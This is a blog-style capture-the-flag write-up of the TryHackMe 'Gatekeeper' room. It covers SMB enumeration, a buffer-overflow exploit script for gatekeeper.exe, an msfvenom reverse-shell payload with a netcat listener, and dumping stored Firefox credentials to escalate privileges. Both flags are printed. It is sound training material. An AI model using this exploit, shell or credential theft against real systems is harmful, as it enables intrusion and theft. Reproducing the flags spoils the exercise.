---
title: Gatekeeper Write-up | TryHackMe
date: 2022-06-13 00:00:00 +530
categories: [Write Up, TryHackMe]
tags: [write up, tryhackme, ctf, medium, red team] # TAG names should always be lowercase
---

![screenshot](/assets/img/thm/gatekeeper/1.png)

Can you get past the gate and through the fire?

---

Running threader3000 scan:

```bash
python threader3000
10.10.160.254
```

![screenshot](/assets/img/thm/gatekeeper/2.png)

Running the suggested nmap scan:

```bash
nmap -p139,135,445,3389,31337,49167,49154,49152,49153,49163,49155 -sV -sC -T4 -Pn -oA 10.10.160.254 10.10.160.254
```

![screenshot](/assets/img/thm/gatekeeper/3.png)

![screenshot](/assets/img/thm/gatekeeper/4.png)

![screenshot](/assets/img/thm/gatekeeper/5.png)

:) Hmm, So many ports.

So we have a smb server at `139/445`, Unknown host with text `Elite` on 31337(upon connecting with netcat gives echo text).

so theres a interesting url in nmap result which we need to find on how to access.

```bash
GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
```

checking the smb for a while:

enumerating the directories :)

```shell
smbclient -N -L \\10.10.160.254
```

![screenshot](/assets/img/thm/gatekeeper/6.png)

trying to access Users directory without password:

```shell
smbclient -N //10.10.160.254/Users
```

found `gatekeeper.exe`, downloading it using get:

![screenshot](/assets/img/thm/gatekeeper/7.png)

after downloading gatekeeper. :) turning on windows VM and copying the file there.

launching the program in immunity debugger and testing it for buffer overflows.

First, lets setup mona for easier exploitation:

```shell
!mona config -set workingfolder c:\mona\%p
```

for finding the offset:

lets generate pattern using pattern_create.rb from metasploit and use it as a payload ;-; to find the offset.

```shell
/opt/metasploit-git/tools/exploit/pattern_create.rb -l length
```

The program crashes at length: `200`.

finding the offset using mona:

```shell
!mona findmsp -distance 200
```

Offset:`146`

We need to create a script.

```python
import socket
import struct
TCP_IP = '192.168.122.138'
TCP_PORT = 31337
BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
payload = ""
overflow = "A"*146
retn = "BBBB"
padding = ""#"\x90"*16
msg = overflow + retn + padding + payload +"\n"
s.send(bytes(msg, "latin-1"))
s.close()
print( "done")
```

this will set the retn(EIP) value to `BBBB` (`0x42424242`)

lets check for badchars now.

generate bytearray in mona:

```shell
!mona bytearray -b "\x00"
```

generating ;-; chars using a python script:

```python
for x in range(1, 256):
print("\\x" + "{:02x}".format(x), end='')
print()
```

using it as the payload:

comparing bytes using mona:

```shell
!mona compare -f "c:\mona\gatekeeper\bytearray.bin" -a 007319E4
```

![screenshot](/assets/img/thm/gatekeeper/8.png)

we can see that `\x0a` is a bad character too. generating byte array without it:

```shell
!mona compare -f "c:\mona\gatekeeper\bytearray.bin" -a 007319E4
```

After removing the character from the payload and sending it.

we can compare characters again using mona. Which gives us:

![screenshot](/assets/img/thm/gatekeeper/9.png)

:) So we now have the badchars, lets find JMP ESP instruction that isn’t under ASLR using mona:

```shell
!mona jmp -r esp -cpb "\x00\x0a"
```

![screenshot](/assets/img/thm/gatekeeper/10.png)

changing retn value to `\xc3\x14\x04\x08` in the python script.(little endian, `0x080414c3`)

Lets generate a reverse shell code for x86 windows machine using msfvenom.

![screenshot](/assets/img/thm/gatekeeper/11.png)

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=MY_MACHINE_IP LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
```

using it as a payload and a NOP padding of 16.

setting up a listener :)

```shell
nc -lvnp 4444
```

lets try to gain a reverse shell on our VM:

![screenshot](/assets/img/thm/gatekeeper/12.png)

Hmm :) success. Now lets try it on the tryhackme’s machine.

success:

![screenshot](/assets/img/thm/gatekeeper/13.png)

Getting our first flag:

```
{H4lf_W4y_Th3r3}
```

:) So, We mostly need to gain local privileges to the account Mayor.

lets do some enumeration:

using windows exploit suggester 2.0;

```shell
python2 windows-exploit-suggester.py --database 2022-06-13-mssb.xls --systeminfo mew.txt
```

;-; trying out few exploits:-

![screenshot](/assets/img/thm/gatekeeper/14.png)

Hmm, Tried few others which failed too, :-; including getsystem of meterpreter.(;-; I tried winpeas too which didn’t give me much helpful info)

got a hint from discord to check about firefox creds.

Found this resource about dumping firefox credentials: [link](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-steal-decrypt-passwords-stored-chrome-firefox-remotely-0183600/)

downloading the files as per given in the link and renaming. :) we get some credentials.

![screenshot](/assets/img/thm/gatekeeper/15.png)

We can try to use this to access smb and directly just get the flag. :)

```shell
smbclient //10.10.160.254/Users -U mayor
```

![screenshot](/assets/img/thm/gatekeeper/16.png)

The final flag:

```
{Th3_M4y0r_C0ngr4tul4t3s_U}
```
